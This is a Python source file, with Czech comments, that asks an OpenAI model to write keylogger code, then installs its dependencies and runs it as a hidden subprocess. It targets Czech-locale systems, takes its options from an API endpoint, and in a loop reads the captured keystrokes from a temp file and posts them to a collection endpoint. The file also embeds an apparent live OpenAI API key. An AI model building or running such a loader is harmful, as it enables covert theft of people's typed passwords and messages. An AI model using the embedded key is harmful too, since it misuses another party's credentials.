import aiohttp 
import sys, importlib, subprocess, time, locale, os, ast, textwrap, json, re, asyncio #Součástí standardní knihovny Pythonu
import openai
from openai import OpenAI

def install_if_needed(package_name) -> None:
    try:
        importlib.import_module(package_name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

class Options:
    def __init__(self,interval=10,force_start=False) -> None:
        self.interval: int = interval
        self.force_start: bool = force_start

class Data: 
    def __init__(self, data:str) -> None:
        self.textId:int = 0
        self.data:str = data

async def send_data(data: Data) -> None:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post('http://localhost:7133/api/data', json=data) as response:
                pass
    except:
        pass

def gptRequest(message:str, system: str) -> dict:

    client = OpenAI(
    api_key="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")
    

    chat_completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": f"{system}"},
                {"role": "user", "content": f"{message}"}
            ],
            model="gpt-4o-mini",
        )

    tmp = chat_completion.choices[0].message.content
    print(tmp)


    return tmp

# Function to extract imported packages from Python code
def get_imported_packages(code) -> list:
    """
    Parse Python code and extract the imported packages.
    """
    try:
        tree = ast.parse(code)
        packages = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    packages.append(alias.name.split('.')[0])
            elif isinstance(node, ast.ImportFrom):
                if node.module:
                    packages.append(node.module.split('.')[0])
        return list(set(packages))  # Remove duplicates
    except Exception as e:
        print(f"Error parsing code: {e}")
        return []

async def handle_keylogger_process_output(process):
    """
    Asynchronously capture and print the output and errors from the running process.
    """
    stdout, stderr = await process.communicate()

    if stdout:
        print(f"Output:\n{stdout.decode()}")
    if stderr:
        print(f"Error:\n{stderr.decode()}")

async def execute_malware():
    # Get code
    code = gptRequest("Vygeneruj kód pro zachycování vstupu systému z klávesnice a ukládej je do souboru 'temp.txt'", "")

    #------------------------------------------ repair code --------------------------------------------
    # Dedent the code to normalize indentation
    code = textwrap.dedent(code.strip())

    # Handle escaping inside string literals
    def escape_strings(match):
        # Extract the string literal
        string = match.group(0)
        # Escape backslashes and newlines inside the string
        escaped = string.replace("\\", "\\\\").replace("\n", "\\n").replace("\t", "\\t")
        return escaped

    # Regex to match string literals (single-line, double or single quotes)
    string_literal_pattern = r'(\'(?:\\.|[^\\\'])*\'|"(?:\\.|[^\\"])*")'

    # Replace all string literals with escaped versions
    repaired_code = re.sub(string_literal_pattern, escape_strings, code)
    #----------------------------------------------------------------------------------------------------

    # Install packages
    packages = get_imported_packages(repaired_code)
    if packages:
        for package in packages:
            install_if_needed(package)

    # Write code to file
    file_path = "keylogger.py"
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(repaired_code)
    except Exception as e:
        print(f"Error saving code to file: {e}")

    # Exexute file
    try:
        # Create a subprocess to run the Python file asynchronously
        process = await asyncio.create_subprocess_exec('python', file_path, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)

        # Optionally: handle output and errors without waiting (could be done in the background)
        asyncio.create_task(handle_keylogger_process_output(process))

        return process  # Return the process object
    except Exception as e:
        print(f"Error executing the file: {e}")
        return None

async def load_data() -> str:
    file_path = "temp.txt"

    # Load data from file
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            content = file.read()
    except Exception as e:
        print(f"Error reading the file: {e}")
        return ""

    # Clear file
    try:
        with open(file_path, "w", encoding="utf-8") as file:
            # Writing nothing to the file to clear its content
            file.write("")
    except Exception as e:
        print(f"Error clearing the file: {e}")

    return content

async def sercet_execute() -> None:

    install_if_needed('aiohttp')
    install_if_needed('openai')

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('http://localhost:7133/api/options') as response:
                data = await response.json()
                options = Options(interval=data['interval'], force_start=data['force_start'])
    except:
        options = Options()

    system_language, system_encoding = locale.getdefaultlocale()

    if system_language=='cs_CZ' or options.force_start:
        keylogger_process = await execute_malware()

        #load and send data every n seconds
        while(True):
            time.sleep(options.interval)
            text = await load_data()

            await send_data(Data(data=text))

    keylogger_process.kill()  # Forcefully kill the process
    #await keylogger_process.wait()  # Optionally wait for the process to kill
    
    pass
